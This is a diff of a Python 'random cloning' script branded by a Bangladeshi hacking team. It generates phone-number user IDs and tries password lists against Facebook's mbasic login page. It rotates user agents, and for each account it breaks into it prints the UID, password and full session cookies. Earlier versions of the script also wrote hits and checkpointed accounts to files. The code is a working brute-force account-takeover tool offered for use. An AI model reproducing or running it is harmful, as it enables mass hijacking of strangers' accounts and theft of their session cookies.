@@ -186,12 +186,12 @@ except Exception as e:
 prox=open('.prox.txt','r').read().splitlines()
   
 logo=(""" 
-.d8888. db    db    d88b  .d88b.  d8b   db 
+d8888. db    db    d88b  .d88b.  d8b   db 
 88'  YP 88    88    `8P' .8P  Y8. 888o  88 
 `8bo.   88    88     88  88    88 88V8o 88 
   `Y8b. 88    88     88  88    88 88 V8o88 
 db   8D 88b  d88 db. 88  `8b  d8' 88  V888 
-`8888Y' ~Y8888P' Y8888P   `Y88P'  VP   V8P
+`8888Y' ~Y8888P' Y8888P   `Y88P'  VP   V8P V1.0
 [~] AUTHOR     : SUJON BE'VIES 
 [~] TEAM       : CYBER SOLUTION BD(CSB)
 [~] TOOLS      : GIFT FOR OUR BANGALI BROTHERS
@@ -227,14 +227,14 @@ def ATC():
 	os.system('clear')
 	print(logo)
 	print("[1] START RANDOM CLONING")
-	print("[2] INBOX ME IF FATCHING PROBLEM")
+	print("[2] SUBSCRIBE MY CHANNEL")
 	print('[0]\033[1;91m EXIT PROGRAMMING\033[1;97m')
 	print('\033[1;97m-------------------------------------------------------')
 	atc = input('[+] CHOOSE OPTION : ')
 	if atc in ["01","1"]:
 		rnd()
 	if atc in ["02","2"]:
-		os.system('https://www.facebook.com/sujonbevies');ATC
+		os.system('xdg-open https://www.facebook.com/sujonbevies');ATC
 	if atc in ["E","0"]:
 		exit("[+] THANKS FOR USE")
 	else:
@@ -262,7 +262,7 @@ def rnd():
 		print('\033[1;97mâ”â”[+] COUNTRY    : Bangladesh')
 		print('\033[1;97mâ”£â”[+] TOTAL ID   :\033[1;92m '+tl)
 		print(f'\033[1;97mâ”£â”[+] SIM CODE   :\033[1;92m {kode} ')
-		print('\033[1;97mâ”—â”[+] \033[1;91mON/OFF YOUR DATA/WIFI BEFORE USE')
+		print('\033[1;97mâ”—â”[+] \033[1;91mON/OFF YOUR MOBILE DATA BEFORE USE')
 		print('\033[1;97m-------------------------------------------------------')
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -282,7 +282,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;97m[RUNNING] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r\033[1;97m[SUJON😤🫴] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mTOTAL:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -297,7 +297,7 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {{
+            header_freefb = {
             'authority': 'mbasic.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
@@ -315,31 +315,23 @@ def b(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro'}
-
+           'user-agent': pro,}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
+            heron_brand=session.cookies.get_dict().keys()
+            if "c_user" in heron_brand:
+                hh=str(len(ok))
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print(f'\r\33[1;92m[OK] '+cid+' | '+ps+'\33[0;97m')
-                print(f'\r\033[1;97m[ðŸª]COOKIE :\033[1;92m '+coki)
-                cek_apk(session,coki)
-                oks.append(cid)
-                open('/sdcard/BD-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                xx=coki.split("c_user=")[1]
+                xd=xx[:15]
+                print("\r\r\n\n")
+                print(Panel(f"\r\r\n[white reverse][ðŸ¥³]=UID/PAS[/white reverse] [bold green]{xd} [cyan]â€¢ [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[ðŸ”¶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
+                ok.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print(f'\r\33[1;91m[CP] '+cid+' | '+ps+'\33[0;97m')
-                open('/sdcard/BD-CP.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
-                cps.append(cid)
-                break
+            
             else:
                 continue
-        loop+=1        
+        loop+=1
     except:
-
-        pass
+        time.sleep(15)
 
 ATC()
